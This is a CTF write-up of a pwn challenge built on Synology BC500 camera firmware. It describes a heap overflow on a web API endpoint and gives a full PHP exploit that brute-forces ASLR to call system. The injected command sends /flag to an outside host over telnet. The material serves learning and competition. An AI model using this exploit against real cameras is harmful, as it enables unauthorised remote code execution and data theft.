# Let's party in the house - Real World CTF 6th (pwn, 6 solved, 378p)
## Introduction
Let's party in the house is a pwn task.

An archive containing a kernel, an initramfs, and a shell script to run QEMU is
given.

The kernel and initramfs appear to have been extracted from the version
`1.0.6-0294` of the Synology BC500 camera as stated by the `version.txt` file
found in `player.cpio`:

```
Series=BC
Model=BC500
Device=IP Camera
Version=1.0.44
MinorVersion=23.10.08
```

## Versions
According to the [Synology_SA_23_15] security advisory, this version contains a
vulnerability that was exploited at Pwn2Own 2023.

[Synology_SA_23_15]: https://www.synology.com/en-global/security/advisory/Synology_SA_23_15

It is possible to download the original firmwares from the constructor's website
and diff them.
`player.cpio` is remixed from upstream version `1.0.6-0294` with only few files changed:
- `/etc/init.d/S25_Net` (Internet in QEMU)
- `/etc/passwd.tmp` (removed root password)
- `/init` (just a new line)
- `/etc/rc.d/init.d/webd` (skip account creation on web interface, creds are `admin:admin`)
    ```
    diag action=update key=Custom.Activated boolval=true
    touch /tmp/backdoor /data/app/backdoor /tmp/wdg_disable /data/app/wdg_disable
    ```

Version `1.0.7` has more files, as expected.

## Finding the bug
The challenge hints that the expected vulnerability is accessible from the web
interface.

With both firmwares in hand, it should be relatively easy to do patch-diffing
and find the bug that can be triggered from the web interface.
Just look at the different files, compare them, look at what appears to be
security fix and exploit the bug.

In practice, it's easier to send long strings everywhere. A bug was found on the
`/syno-api/security/info/language` endpoint.

```sh
curl -v http://127.0.0.1:8080/syno-api/security/info/language \
	-X PUT \
	--data-binary '{"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA": "asdf"}' \
	--header 'Content-Type: application/json' \
curl: (52) Empty reply from server
```

The file located at `/mnt/SD0/core_dump_log.txt` can be used to identify where
the bug occured: in `/www/camera-cgi/synocam_param.cgi`.

## Exploitation
The exploitation is very straightforward: the vulnerability identified before is
a heap-based buffer overflow with a function pointer at offset `0xA4`.

This function pointer gets called with `r0` being set to the middle of the
buffer. This is a perfect match for a call to `system`.

One caveat is that, since this is a json string, only valid UTF-8 characters are
accepted.

The exploit abuses the randomness of ASLR to call `system` when the libc is
located at `0x767ae000`.

The payload cannot contain spaces, but this can be bypassed with `${IFS}`.
```sh
/////////////usr/bin/telnet 192.168.1.1 12345 < /flag
```

**Flag**: `rwctf{d0e03372-b885-4418-9de7-145a4e66ec0d}`

## Appendices
### pwn.php
```php
<?php
$libc   = 0x767ae000;
$system = 0x00039070;
$ptr    = $libc + $system;

$sp   = '${IFS}';
$key  = implode($sp, ["/usr/bin/telnet", "0xC0A80101", "12345"]);
$key .= "</flag";
$key .= ";#";
$key  = str_pad($key, 0xA4, "/", STR_PAD_LEFT);

$key .= pack("V", $ptr);
$key  = rtrim($key, "\x00");
$payload = json_encode([$key => 1]);

$curl = curl_init("http://127.0.0.1:8080/syno-api/security/info/language");
curl_setopt_array($curl, [
	//CURLOPT_VERBOSE => true,
	CURLOPT_CUSTOMREQUEST => "PUT",
	CURLOPT_POSTFIELDS    => $payload,
	CURLOPT_HTTPHEADER    => [
		"Content-Type: application/json",
	],
]);

while(1) {
	$t = microtime(true);
	curl_exec($curl);
	$t = microtime(true) - $t;
	printf("\r%f", $t);

	if($t > 1)
		printf("\n");
}
```
